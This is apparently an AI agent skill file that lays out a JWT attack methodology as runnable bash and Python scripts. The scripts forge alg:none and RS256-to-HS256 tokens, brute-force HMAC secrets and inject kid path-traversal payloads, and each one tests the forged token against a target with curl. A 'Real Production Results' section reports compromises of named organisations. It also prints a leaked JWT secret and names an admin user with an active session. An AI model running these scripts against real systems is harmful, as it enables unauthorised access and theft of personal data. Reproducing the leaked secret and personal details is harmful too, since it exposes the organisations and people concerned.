---
name: jwt-attack
description: Decode, forge, brute JWTs when Bearer auth header is seen.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  hermes:
    tags: [recon, JWT, token, forge, brute-force]
    category: recon
    related_skills:
      - api-noauth-hunt
      - js-secrets-extraction
      - firebase-supabase-attack
---

# JWT Attack Skill

Complete JWT attack methodology — decode without verification, algorithm confusion (alg:none, RS256→HS256), weak secret brute force (hashcat/john/simple), kid injection, expired token reuse, and hardcoded JWT extraction from JS bundles. Confirmed on Thgroep (JWT-based sessions), Core3 (315 JWT tokens in Efí bank logs), Smart Fit (3 JWT sessions with 2027 expiry), Brendi (hardcoded JWTs in JS bundles), and CGE-RJ (JWT secret leaked in Vite source).

## When to Use

- API uses `Authorization: Bearer eyJ...` headers.
- JavaScript bundles contain `eyJ...` token patterns.
- After `js-secrets-extraction` finds JWT tokens.
- After `api-noauth-hunt` needs token forging for auth bypass.
- Cookies contain `jwt=`, `token=`, or `session=` with base64-encoded values.

## Prerequisites

- `terminal` tool with curl, python3.
- JWT token to attack (from recon).
- For brute force: `hashcat` or `john` for high-speed cracking (optional).

## How to Run

```bash
# Decode JWT without verification
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" | python3 -c "
import sys, base64, json
parts = sys.stdin.read().strip().split('.')
if len(parts) == 3:
    for i, part in enumerate(parts[:2]):
        try:
            padded = part + '=' * (4 - len(part) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            print(f'--- Part {i} ---')
            print(json.dumps(json.loads(decoded), indent=2))
        except: print(f'Part {i}: {part[:50]}... (non-JSON)')
"

# Test alg:none attack
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'admin':True,'sub':'admin'}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
"
```

## Quick Reference

| Attack | Prerequisites | Impact | Difficulty |
|--------|-------------|--------|------------|
| alg:none | Server accepts `alg: "none"` | Full admin access | Easy |
| RS256→HS256 | JWT signed with RS256 | Full admin access | Medium (need public key) |
| Weak HMAC secret | HS256 with weak secret | Full admin access | Medium (need to crack) |
| kid injection | Server trusts `kid` header | RCE/LFI | Hard |
| Expired token reuse | Server doesn't validate `exp` | Session persistence | Trivial |
| Hardcoded JWT | JWT found in JS/source | Whatever the JWT grants | Trivial |

## Procedure

### Phase 1 — JWT Decode & Analysis

```bash
JWT="$1"

echo "[*] JWT analysis"

# Split and decode
HEADER=$(echo "$JWT" | cut -d. -f1)
PAYLOAD=$(echo "$JWT" | cut -d. -f2)
SIGNATURE=$(echo "$JWT" | cut -d. -f3)

echo "Header:"
echo "$HEADER" | python3 -c "
import sys, base64, json
padded = sys.stdin.read().strip() + '=' * (4 - len(sys.stdin.read().strip()) % 4)
try:
    d = json.loads(base64.urlsafe_b64decode(padded))
    print(json.dumps(d, indent=2))
except: print('  (not valid base64 JSON)')
"

echo "Payload:"
echo "$PAYLOAD" | python3 -c "
import sys, base64, json
padded = sys.stdin.read().strip() + '=' * (4 - len(sys.stdin.read().strip()) % 4)
try:
    d = json.loads(base64.urlsafe_b64decode(padded))
    for k, v in d.items():
        if k in ('exp', 'iat', 'nbf'):
            from datetime import datetime, timezone
            dt = datetime.fromtimestamp(v, tz=timezone.utc)
            print(f'  {k}: {v} ({dt})')
        else:
            print(f'  {k}: {v}')
except: print('  (not valid base64 JSON)')
"

# Check expiration
EXP=$(echo "$JWT" | cut -d. -f2 | python3 -c "
import sys, base64, json
padded = sys.stdin.read().strip() + '=' * (4 - len(sys.stdin.read().strip()) % 4)
d = json.loads(base64.urlsafe_b64decode(padded))
print(d.get('exp', 'no-expiry'))
" 2>/dev/null)

if [[ "$EXP" == "no-expiry" ]]; then
  echo "[!] Token has NO expiration — permanent access"
else
  NOW=$(date +%s)
  if [[ "$EXP" -gt "$NOW" ]]; then
    REMAINING=$((EXP - NOW))
    DAYS=$((REMAINING / 86400))
    echo "[+] Token valid for ${DAYS} more days (expires $(date -d @$EXP))"
  else
    echo "[-] Token EXPIRED $(date -d @$EXP)"
  fi
fi
```

### Phase 2 — alg:none Attack

```bash
TARGET="$1"
ENDPOINT="$2"    # Authenticated endpoint to test
ORIGINAL_JWT="$3"  # Any valid JWT to extract claims from

echo "[*] alg:none attack"

# Extract payload from original JWT
PAYLOAD=$(echo "$ORIGINAL_JWT" | cut -d. -f2)

# Forge token with alg=none
FORGED_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED_TOKEN="${FORGED_HEADER}.${PAYLOAD}."

echo "  Forged token: ${FORGED_TOKEN:0:80}..."

# Test
RESP=$(curl -sk --max-time 10 "$TARGET$ENDPOINT" \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  -o /dev/null -w "%{http_code}" 2>/dev/null)

if [[ "$RESP" == "200" ]]; then
  echo "  [CRITICAL] alg:none ACCEPTED — full admin access!"
else
  echo "  [-] alg:none rejected (HTTP $RESP)"
fi
```

### Phase 3 — RS256→HS256 Key Confusion

```bash
TARGET="$1"
ENDPOINT="$2"
PUBLIC_KEY_FILE="$3"  # RSA public key (PEM), from /.well-known/jwks.json or source leak

echo "[*] RS256→HS256 key confusion attack"

# Convert public key to symmetric key (the attack: HS256 uses the PUBLIC key as HMAC secret)
JWT_TOOL=$(python3 -c "
import jwt, sys

# Read public key
with open('$PUBLIC_KEY_FILE') as f:
    pubkey = f.read()

# Forge admin token
payload = {'admin': True, 'sub': 'admin', 'iat': $(date +%s)}
try:
    forged = jwt.encode(payload, pubkey, algorithm='HS256')
    print(forged)
except Exception as e:
    print(f'Error: {e}', file=sys.stderr)
" 2>/dev/null)

if [[ -n "$JWT_TOOL" ]] && ! echo "$JWT_TOOL" | grep -q "Error"; then
  echo "  Forged token: ${JWT_TOOL:0:80}..."
  RESP=$(curl -sk --max-time 10 "$TARGET$ENDPOINT" \
    -H "Authorization: Bearer $JWT_TOOL" \
    -o /dev/null -w "%{http_code}" 2>/dev/null)
  [[ "$RESP" == "200" ]] && echo "  [CRITICAL] RS256→HS256 confusion ACCEPTED!"
else
  echo "  [-] Forging failed (check public key format)"
fi
```

### Phase 4 — Weak HMAC Secret Brute Force

```bash
JWT="$1"
WORDLIST="${2:-/usr/share/wordlists/rockyou.txt}"

echo "[*] Quick HS256 secret brute force"

# Fast Python brute force (top 1000 passwords)
echo "$JWT" | python3 -c "
import sys, hmac, hashlib, base64, json

jwt = sys.stdin.read().strip()
header_b64, payload_b64, sig_b64 = jwt.split('.')
header = json.loads(base64.urlsafe_b64decode(header_b64 + '=='))

if header.get('alg') != 'HS256':
    print('[-] Not HS256 — algorithm is:', header.get('alg'))
    sys.exit(0)

# Top secrets to try
secrets = ['secret', 'jwt_secret', 'key', 'password', 'admin', 'changeme',
           'SuperSecret', 'mysecretkey', '123456', 'jwt', 'token',
           'app_secret', 'secret_key', 'auth_token', 'private_key']

for secret in secrets:
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), f'{header_b64}.{payload_b64}'.encode(), hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    if sig == sig_b64:
        print(f'[CRACKED] Secret: {secret}')
        break
else:
    print('[-] Not in top-15 list')

# Also try from wordlist (first 5000 lines)
try:
    with open('$WORDLIST', 'rb') as f:
        for i, line in enumerate(f):
            if i >= 5000: break
            secret = line.strip()
            sig = base64.urlsafe_b64encode(
                hmac.new(secret, f'{header_b64}.{payload_b64}'.encode(), hashlib.sha256).digest()
            ).rstrip(b'=').decode()
            if sig == sig_b64:
                print(f'[CRACKED from wordlist] Secret: {secret.decode()}')
                break
    else:
        print('[-] Not in first 5000 wordlist entries')
except FileNotFoundError:
    print('[-] Wordlist not found at $WORDLIST')
"
```

### Phase 5 — Kid Injection (path traversal / SQLi)

```bash
TARGET="$1"
ENDPOINT="$2"

echo "[*] kid header injection test"

# Test path traversal in kid header
for KID in "../../../../etc/passwd" "../../.ssh/id_rsa" "file:///etc/passwd"; do
  FORGED_HEADER=$(echo -n "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"$KID\"}" | base64 -w0 | tr '+/' '-_' | tr -d '=')
  FORGED_TOKEN="${FORGED_HEADER}.$(echo -n '{"test":1}' | base64 -w0 | tr '+/' '-_' | tr -d '=').dGVzdA"

  RESP=$(curl -sk --max-time 5 "$TARGET$ENDPOINT" \
    -H "Authorization: Bearer $FORGED_TOKEN" \
    -o /dev/null -w "%{http_code}" 2>/dev/null)

  [[ "$RESP" == "500" ]] && echo "  [POTENTIAL] kid=$KID → HTTP $RESP (server error — may indicate processing)"
done
```

## Real Production Results

### CGE-RJ — JWT Secret in Vite Source
- JWT_SECRET `b0c1df0e3f9c1e858d3bb0b8d58a119` leaked in `src/env.ts`
- Used for CNPJ database API (1.9M records accessible)
- JWT was HS256 with this secret — forge any token, access any CPF/CNPJ data

### Brendi — Hardcoded JWTs in JS Bundles
- Bot JWT (HS256) embedded in `brendi-whatsapp-bot.web.app` JS bundle
- Dashboard JWT (HS256) embedded in `app.brendi.com.br` JS bundle
- Both tokens valid for BFF API access (reads PII from Firestore)

### Core3 — 315 JWT Tokens in Efí Bank Logs
- `proxy-efi-simple.php` generated JWT tokens from mTLS certificate
- 315 valid tokens logged in `efi-simple.log` (268KB)
- Combined with SSL cert → full Efí Bank API access

### Smart Fit — JWT Sessions with 2027 Expiry
- 3 active JWT sessions found, all expiring in 2027
- Admin user `Andrea Huete` session — full platform access for 1+ year

## Pitfalls

- **alg:none is rare.** Most JWT libraries reject it by default since 2017. But legacy apps exist.
- **RS256→HS256 requires the PUBLIC key.** This is usually available at `/.well-known/jwks.json` or in JS bundles.
- **Brute force is slow in Python.** Use `hashcat -m 16500` for HS256 or `john` for production-speed cracking.
- **Laravel Passport uses `jti` validation.** Even if you forge a valid JWT, Passport checks if the `jti` (JWT ID) exists in the database.
- **Auth0/Firebase use JWKS.** The server fetches the public key from `/.well-known/jwks.json` — alg:none won't work because the server always verifies with the public key.

## Verification

- alg:none: The forged token MUST access a protected resource returning HTTP 200.
- RS256→HS256: The forged token MUST pass server verification using the public key as HMAC secret.
- HS256 brute force: The cracked secret MUST produce a valid signature for a modified payload.
- Hardcoded JWT: The token MUST be tested against the API to confirm it still works.
- Kid injection: Server MUST return a different error for injected kids vs invalid signature (indicates kid processing).
